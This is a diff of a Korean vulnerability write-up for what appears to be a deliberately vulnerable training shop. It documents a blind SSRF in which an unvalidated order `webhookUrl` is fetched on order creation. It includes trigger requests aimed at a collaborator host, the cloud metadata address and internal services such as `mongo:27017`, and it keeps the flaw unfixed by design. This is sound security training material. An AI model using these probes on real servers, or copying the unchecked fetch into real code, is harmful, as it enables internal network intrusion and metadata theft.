@@ -6,8 +6,12 @@
 
 ## 위치
 
-- `apps/node-express/src/routes/orders.js` — `POST /api/orders`가 요청 바디의 `webhookUrl`을 검증 없이 `orders.webhook_url`에 저장하고, 결제 확인(`POST /api/orders/:id/confirm`) 성공 시 `fireWebhook()`이 그 URL로 서버가 직접 `fetch()`를 호출한다.
-- `apps/java-spring/src/main/java/com/vulnlab/shop/controller/OrderController.java` — 동일 구조. `create()`가 `webhookUrl`을 무검증으로 `Order.webhookUrl`에 저장하고, `confirm()` 성공 시 `fireWebhook()`이 `HttpClient`로 그 URL에 직접 `POST` 요청을 보낸다.
+- `apps/node-express/src/routes/orders.js` — `POST /api/orders`가 `webhookUrl`을 검증 없이 저장하고,
+  **주문 생성 직후 `fireWebhook()`**(`order.created`)으로 그 URL에 `fetch()`한다. 결제 확인
+  (`POST /api/orders/:id/confirm`) 성공 시 `order.paid`도 발송.
+- `apps/java-spring/src/main/java/com/vulnlab/shop/controller/OrderController.java` — 동일 구조.
+  `create()`가 `webhookUrl` 무검증 저장 후 `fireWebhook(..., "order.created", "pending")`을 호출하고,
+  `confirm()` 성공 시 `order.paid`를 발송한다. `fireWebhook`는 `HttpClient.sendAsync`(비차단)로 그 URL에 `POST`.
 
 ```js
 async function fireWebhook(webhookUrl, payload) {
@@ -20,42 +24,41 @@ async function fireWebhook(webhookUrl, payload) {
 
 두 스택 모두 URL 스킴/호스트에 대한 allowlist가 전혀 없다 — `http://169.254.169.254/...` 같은 내부망·메타데이터 주소도 그대로 요청한다.
 
-이 UI 필드(Cart 페이지의 "Order webhook URL")는 제거했고, `POST /api/orders`가 여전히 `webhookUrl` 바디를
-받지만 **실제 발송은 결제 확인 경로 안쪽에서만** 일어난다(아래 재현 제약).
+체크아웃에 **"주문 알림 URL"**(선택) 필드가 있어, 주문을 넣으면 서버가 그 URL로 "주문 접수"(`order.created`,
+status `pending`) 웹훅을 **즉시** 발송한다(결제 확인 시 `order.paid`도 추가 발송). 즉 결제 완주 없이도
+주문 생성만으로 서버가 임의 URL에 아웃바운드 요청을 보낸다.
 
 ## 트리거 방법
 
 ```
-POST /api/orders
+POST /api/{node,java}/orders
 {"items":[{"productId":1,"quantity":1}],"webhookUrl":"http://<collaborator-host>/"}
-→ 이어서 POST /api/orders/:id/confirm  (Toss 결제 확인 성공 시에만 fireWebhook 발화)
+→ 주문 생성 직후 서버가 webhookUrl 로 order.created 웹훅을 즉시 발송(결제·confirm 불필요)
 ```
 
-**재현 제약(중요)**: `fireWebhook`는 `confirm()`이 **Toss 결제 확인에 성공한 뒤에만** 호출된다.
-`confirm`은 `TOSS_SECRET_KEY`가 없으면 501을 반환하고(기본 랩 상태), 있어도 실제 Toss 위젯 결제로 받은
-유효한 `paymentKey`로 `https://api.tosspayments.com/.../confirm`이 <300을 반환해야 진행된다. 따라서
-"주문 생성 → confirm 한 번"만으로는 발송되지 않으며, **재현하려면 Toss 테스트 키 설정 + 위젯 결제 완주가
-필요**하다. 무-Toss 랩에서는 발화하지 않음.
-
-응답 반환형이며 관리자만 있으면 바로 재현되는 SSRF는 [[VULN-033-restock-callback-ssrf]]
-(웹훅 테스트 버튼)을 참고 — 004는 blind + 결제경로 게이팅이라 실증 난이도가 높다.
+내부 서비스(같은 Docker 네트워크의 다른 컨테이너 `http://mongo:27017`, `http://java-spring:8081/...` 등)를
+지정하면 내부망 프로빙에 그대로 쓰인다. blind(응답은 반환하지 않음) — 응답 반환형 SSRF는
+[[VULN-033-restock-callback-ssrf]](관리자 웹훅 테스트) 참고.
 
 ## 영향
 
-- (게이팅을 통과하면) 서버를 프록시 삼아 임의 내부/외부 호스트로 blind 아웃바운드 요청 — 내부망 스캐닝,
-  메타데이터 엔드포인트 접근 시도 등. 5초 타임아웃 외 제약 없음.
+- 서버를 프록시 삼아 임의 내부/외부 호스트로 blind 아웃바운드 요청 — 내부망 스캐닝, 클라우드 메타데이터
+  엔드포인트 접근 시도 등. 5초 타임아웃 외 allowlist·스킴/호스트 검증이 전혀 없다. 로그인 사용자면 누구나
+  주문 하나로 발화시킬 수 있다.
 
 ## 증거 (재현 확인)
 
-**재현 제약**: 2026-09-01 코드 확인 기준 `fireWebhook`는 Toss confirm 성공 분기에서만 호출되고, 기본 랩은
-`TOSS_SECRET_KEY` 미설정이라 `confirm`이 501 → 웹훅 미발송. 따라서 무-Toss 환경에서 문서 페이로드만으로는
-**재현되지 않음**(발송 자체가 게이팅됨). 실증은 Toss 테스트 결제 완주 후 Collaborator 수신으로 확인해야 함.
+2026-09-01, 로컬 재현(`:8090`, `user1`, Toss 미설정): 양 스택에서 `POST /orders`에 `webhookUrl` 지정 →
+주문 생성만으로 즉시 발송 확인. `webhookUrl=http://mongo:27017/ssrf` 지정 시 mongo 로그에 node 컨테이너
+(`172.20.0.4`)·java 컨테이너(`172.20.0.2`)發 연결 수신(`SSL handshake received but server is started
+without SSL support` — HTTP 요청이 내부 서비스에 도달). node는 `webhookUrl=http://127.0.0.1:9/...` 시
+`Order webhook delivery failed: fetch failed` 로그로 발송 시도 확인. **confirm/Toss 없이 재현됨.**
 
-## 정상 서비스 흐름에서의 어색함
+## 재구성 이력
 
-주문 웹훅 UI는 제거됐고 body 파라미터만 남아, 실제 발송이 결제 성공 경로 깊숙이에서만 일어난다 — 정상
-서비스로는 노출 지점이 거의 없고 실증도 어렵다. **후속 개선 후보**: (a) 발송을 order lifecycle의 명시적
-"주문 알림 웹훅 등록/테스트" 기능으로 자연스럽게 노출하거나, (b) VULN-033처럼 응답 반환형 테스트 경로로
-정리. (이번 감사에서는 코드 미변경, 문서로만 명시.)
+당초 웹훅은 결제 confirm(Toss) 성공 경로에서만 발화해 정상 흐름 노출이 거의 없고 무-Toss 랩에서 재현이
+불가했다. 이를 실제 커머스의 **"주문 접수 알림 웹훅"**(체크아웃의 선택 "주문 알림 URL" → 주문 생성 시
+`order.created` 발송)으로 재구성해 자연스러운 기능 안에 넣고 재현 가능하게 했다. 취약점(스킴/호스트
+allowlist 부재)은 그대로 유지. `fireWebhook`는 java에서 `sendAsync`(비차단)로 발송한다.
 
 ## 조치 상태: 미조치 (의도된 취약점)
